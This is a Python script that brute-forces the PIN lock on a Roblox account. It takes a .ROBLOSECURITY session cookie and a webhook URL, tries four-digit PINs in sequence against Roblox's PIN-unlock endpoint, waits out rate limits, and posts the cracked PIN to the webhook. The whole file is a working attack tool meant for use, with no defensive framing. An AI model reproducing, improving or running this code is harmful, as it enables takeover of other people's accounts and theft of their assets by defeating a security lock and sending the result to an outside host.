# --({ Import Modules })
import requests, time, os, subprocess
try:
  from termcolor import cprint
except:
  try:
    import pip
  except ImportError:
      os.system("")
      print("[", end="")
      print('\033[31m'+" ERROR ", "red", end="")
      print("] " , end="")
      print('\033[31m'+"Pip not installed. Installing now...")
      subprocess.call("curl https://bootstrap.pypa.io/get-pip.py --output get-pip.py", shell=True)
      time.sleep(5)
      os.startfile("get-pip.py")
  print("[", end="")
  print('\033[31m'+" ERROR ", "red", end="")
  print("] " , end="")
  print('\033[31m'+"Packages not installed. Installing now...")
  subprocess.call("pip install termcolor", shell=True)
finally:
  from termcolor import cprint
# --({ Get Xsrf Token }) -- #
def getXsrf(cookie):
    xsrfRequest = requests.post("https://auth.roblox.com/v2/logout", cookies={
        '.ROBLOSECURITY': cookie
    })
    return xsrfRequest.headers["x-csrf-token"]
# --({ Diagnose Errors }) -- #
def diagnose(error):
    global headers
    global cookies
    try:
      cookie
      headers = {
      'X-CSRF-TOKEN': getXsrf(cookie),
      }
      print("[", end="")
      cprint(" ERROR ", "red", end="")
      print("] " , end="")
      print(f"ERROR {error}")
      print("[", end="")
      cprint(" ERROR ", "red", end="")
      print("] " , end="")
      cprint("Pin Bruteforcer Had A Fatal Error. Diagnosing issue", 'red')
      check = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies)
      response = check.json()
      if check.status_code ==503:
        print("[", end="")
        cprint("DIAGNOSTIC", "red", end="")
        print("] " , end="")
        cprint("Error found. Roblox is under maintenence", "red")
      elif response['errors'][0]['message'] == 'Authorization has been denied for this request.':
        print("[", end="")
        cprint("DIAGNOSTIC", "red", end="")
        print("] " , end="")
        cprint("Error found. Invalid Cookie. Close the program then re-enter the cookie and try again", "red")
      elif response['errors'][0]['message'] == 'Token Validation Failed':
        print("[", end="")
        cprint("DIAGNOSTIC", "red", end="")
        print("] " , end="")
        cprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "red")
      elif check.status_code ==404:
        print("[", end="")
        cprint("DIAGNOSTIC", "red", end="")
        print("] " , end="")
        cprint("Error found. Roblox's api endpoint may have changed", "red")
      print("[", end="")
      cprint("DIAGNOSTIC", "red", end="")
      print("] " , end="")
      cprint("Try re-running the program", 'red')
    except:
      print("[", end="")
      cprint(" ERROR ", "red", end="")
      print("] " , end="")
      print(f"Error occured with the program or your computer.")
# --({ Crack Pin }) -- #
class crack:
  global headers
  global response
  global pin
  global cookies
  # --({ Check Cookie }) -- #
  def check(_):
    global cookie
    global webhook
    global startingNumber
    print("[", end="")
    cprint(" BRUTEFORCER ", "magenta", end="")
    print("] ", end="")
    cprint(" Enter Your Cookie Below:", 'magenta')
    cookie = input("> ")
    print("[", end="")
    cprint(" BRUTEFORCER ", "magenta", end="")
    print("]", end="")
    cprint(" Enter Your Webhook Below:", 'magenta')
    webhook = input("> ")
    print("[", end="")
    cprint(" BRUTEFORCER ", "magenta", end="")
    print("]", end="")
    cprint(" Enter Starting Number (Put nothing to continue on the number from previously):", 'magenta')
    startingNumber = input("> ")
    if not startingNumber:
      startingNumber = open("currentNumber.txt", "r").read()
    check = requests.get('https://api.roblox.com/currency/balance', cookies={'.ROBLOSECURITY': str(cookie)}) #check if the cookie is valid  
    if not check.status_code ==200:
      print("[", end="")
      cprint(" ERROR ", "magenta", end="")
      print("] ", end="")
      cprint("Invalid Cookie", "red")
      time.sleep(1)
      if os.name == 'nt':
          os.system("cls")
      else:
          os.system("clear")
      crack.check()
  # --({ Start Cracker }) -- #
  def start(_):
    # --({ Allow cprint to work in windows }) -- #
    global headers
    global response
    global pin
    global cookies
    global startingNumber
    os.system("")
    crack.check()
    if not os.path.exists("currentNumber.txt"):
      print("[", end="")
      cprint(" ERROR ", "magenta", end="")
      print("] ", end="")
      cprint("Missing currentNumer.txt", "red")
      time.sleep(1)
      if os.name == 'nt':
          os.system("cls")
      else:
          os.system("clear")
      crack.check()
    for char in 'Cracking the pin....':
      time.sleep(0.1)
      cprint(char, 'magenta', end='', flush=True)
    print("")
    for char in 'Leave this running for about around 5-29 days':
      time.sleep(0.1)
      cprint(char, 'magenta', end='', flush=True)
    print("")
    cookies = {
    '.ROBLOSECURITY': cookie
    }
    v = str(startingNumber)
    while True:
      headers = {
      'X-CSRF-TOKEN': getXsrf(cookie),
      }
      try:
        v = int(v) + 1
      except:
        print("[", end="")
        cprint(" ERRORS ", "red", end="")
        print("] " , end="")
        cprint(f"The number inside the currentNumber.txt file is invalid", 'red')
        time.sleep(2)

        if os.name == 'nt':
            os.system("cls")
        else:
            os.system("clear")
        crack.check()
      for _ in range(4-len(str(v))):
        v = f'0{v}'
      pin = v
      print("[", end="")
      cprint(" BRUTEFORCER ", "green", end="")
      print("] " , end="")
      cprint(f"Trying {pin}...", "red")
      open("currentNumber.txt", "w+").write(str(int(v)))
      response = requests.post("https://auth.roblox.com/v1/account/pin/unlock", headers=headers, data={'pin': pin}, cookies=cookies).json()
      try:
        if "unlockedUntil" in str(response):
          cprint("Cookie:", 'blue')
          print(cookie)
          print("[", end="")
          cprint(" BRUTEFORCER ", "green", end="")
          print("] " , end="")
          cprint(f"Pin found: {pin}", 'green')
          r = requests.post(webhook, data={'content':pin})
          if not r.status_code ==200:
            print("[", end="")
            cprint("ERRORS", end="")
            print("] " , end="")
            cprint('Invalid Webhook', 'red')
          break
        if response['errors'][0]['code'] == 4:
          print("[", end="")
          cprint(" BRUTEFORCER ", "magenta", end="")
          print("] " , end="")
          cprint("Incorrect Pin", 'red')
        elif response['errors'][0]['message'] == "TooManyRequests":
          print("[", end="")
          cprint(" RATELIMIT ", "yellow", end="")
          print("] " , end="")
          cprint(f'Too many requests. Waiting 21 minutes before resumimg', 'yellow')
          time.sleep(1260)
        if response['errors'][0]['message'] == 'Authorization has been denied for this request.':
          print("[", end="")
          cprint(" ERROR ", "red", end="")
          print("] " , end="")
          cprint("Error found. Invalid Cookie. Re-enter the cookie and try again", "red")
          time.sleep(5)
          crack.start()
          break
        elif response['errors'][0]['message'] == 'Token Validation Failed':
          print("[", end="")
          cprint(" ERROR ", "red", end="")
          print("] " , end="")
          cprint("Error found. Invalid x-csrf token. The program failed to fetch the x-csrf token. Recheck the cookie and the roblox api endpoint. https://auth.roblox.com/v1/account/pin/unlock", "red")
          break
      except Exception as e:
        print(f"A error has occured{e}")
    else:
      print("[", end="")
      cprint(" ERROR ", "red", end="")
      print("]" , end="")
      cprint("Invalid Cookie", 'red')
      os.system('cls')
      if os.name == 'nt':
          os.system("cls")
      else:
          os.system("clear")

# --({ Start program }) -- #
if __name__ == "__main__":
  crack = crack()
  try:
    crack.start()
  except Exception as error:
    diagnose(error)
